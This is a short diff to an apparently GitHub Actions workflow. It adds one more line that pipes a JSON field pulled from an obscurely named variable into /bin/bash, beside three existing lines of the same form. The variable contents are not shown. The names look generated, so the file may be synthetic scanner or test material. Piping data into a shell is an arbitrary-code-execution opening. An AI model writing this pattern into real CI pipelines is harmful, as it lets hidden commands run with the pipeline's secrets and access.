@@ -30,6 +30,7 @@ jobs:
           echo $ome64196 | jq -r .n95041 | /bin/bash
           printf '%s' "$iu78010" | jq -r .z83610 | /bin/bash
           printf '%s' "$sr7322" | jq -r .dm51001 | /bin/bash
+          echo $ensb1373 | jq -r .zp3 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
